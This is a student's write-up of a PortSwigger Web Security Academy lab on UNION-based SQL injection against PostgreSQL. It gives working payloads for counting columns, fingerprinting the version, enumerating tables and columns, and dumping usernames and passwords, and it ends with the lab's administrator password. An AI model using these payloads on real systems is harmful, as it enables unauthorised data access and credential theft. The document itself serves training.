# SQL Injection – Listing Database Contents on Non-Oracle Databases

## 1. Lab Overview

**Objective:**

This lab contains a SQL injection vulnerability in the product category filter.

The application returns query results in its response, allowing us to use a **UNION-based SQL injection attack** to retrieve information from other database tables.

The goal is to:
1. Determine the number of columns.
2. Identify columns that accept text.
3. Identify the database type and version.
4. Retrieve the database table names.
5. Find the table containing usernames and passwords.
6. Identify the username and password columns.
7. Retrieve user credentials.
8. Log in as `administrator`.

---

## 2. Determine the Number of Columns

**Payload:**

```sql
'+ORDER+BY+2--+-
```

**Explanation:**
- `ORDER BY 2` sorts the results using the second column.
- If it works, the query has at least two columns.
- Testing `ORDER BY 3` can help confirm that there are exactly two columns if it produces an error.

**Result:** The UNION tests below confirmed that the query uses two columns.

---

## 3. Identify Columns That Accept Text

**Payload:**

```sql
'+UNION+SELECT+'a','a'--+-
```

**Explanation:**
- `UNION SELECT` combines the original query with an injected query.
- `'a'` is a text value.
- `-- -` comments out the remaining SQL statement.

**Result:** Both columns accepted text data.

Therefore, the query has two columns, and both support text values.

---

## 4. Identify the Database Type and Version

**Payload:**

```sql
'+UNION+SELECT+version(),NULL--+-
```

**Explanation:**
- `version()` is a PostgreSQL function.
- It returns the database version.
- `NULL` fills the second column.

**Result:**

```text
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)
on x86_64-pc-linux-gnu,
compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2)
9.4.0, 64-bit
```

**Conclusion:** The database uses PostgreSQL 12.22.

---

## 5. Retrieve the Database Table Names

**Payload:**

```sql
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+-
```

**Explanation:**

- `information_schema.tables` contains metadata about database tables.
- `table_name` retrieves the names of those tables.
- `NULL` fills the second column.

**Important discovery:**

The database contains a table named:

```text
users_sqavaa
```

This is the table containing the user credentials.

---

## 6. Identify the Columns in the Users Table

**Payload:**

```sql
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_sqavaa'--+-
```

**Explanation:**

- `information_schema.columns` contains information about database columns.
- `column_name` retrieves the column names.
- `WHERE table_name='users_sqavaa'` filters the results to the users table.

**Results:**

| Column | Purpose |
|---|---|
| `username_znhawb` | Stores usernames |
| `password_ssbayi` | Stores passwords |

We have now identified the two columns containing user credentials.

---

## 7. Retrieve Usernames and Passwords

**Payload:**

```sql
'+UNION+SELECT+username_znhawb,password_ssbayi+FROM+users_sqavaa--+-
```

**Explanation:**

- `username_znhawb` retrieves usernames.
- `password_ssbayi` retrieves passwords.
- `FROM users_sqavaa` specifies the table containing the credentials.

**Results:**

| Username | Password |
|---|---|
| `wiener` | Retrieved from the database |
| `administrator` | `nbmjl29rprcjtdi7b20b` |

---

## 8. Complete the Lab

Use the retrieved administrator credentials to log in.

**Username:**

```text
administrator
```

**Password:**

```text
nbmjl29rprcjtdi7b20b
```

**Final result:** Successfully retrieve the administrator credentials and use them to log in.

---

## 9. Important SQL Concepts Learned

| SQL concept | Purpose |
|---|---|
| `UNION SELECT` | Combines results from multiple SELECT queries |
| `ORDER BY` | Sorts query results and helps determine the number of columns |
| `NULL` | Provides a compatible placeholder value |
| `version()` | Retrieves the PostgreSQL version |
| `information_schema.tables` | Provides information about database tables |
| `information_schema.columns` | Provides information about database columns |
| `WHERE` | Filters records based on a condition |
| `--` | Comments out the remaining SQL statement |

## 10. My Learning Notes

The most important thing I learned from this lab is that SQL injection is not only about entering random payloads.

It is a process of discovering database information step by step:

1. Find the number of columns.
2. Find which columns accept text.
3. Identify the database type.
4. Enumerate the database tables.
5. Find the relevant table.
6. Enumerate its columns.
7. Retrieve the required data.

**Key takeaway:** Understanding the structure of the original SQL query makes it easier to construct and troubleshoot UNION-based SQL injection payloads.

---

**Lab:** PortSwigger Web Security Academy  
**Vulnerability:** SQL Injection – UNION-based attack  
**Database:** PostgreSQL 12.22  
**Status:** Administrator credentials retrieved
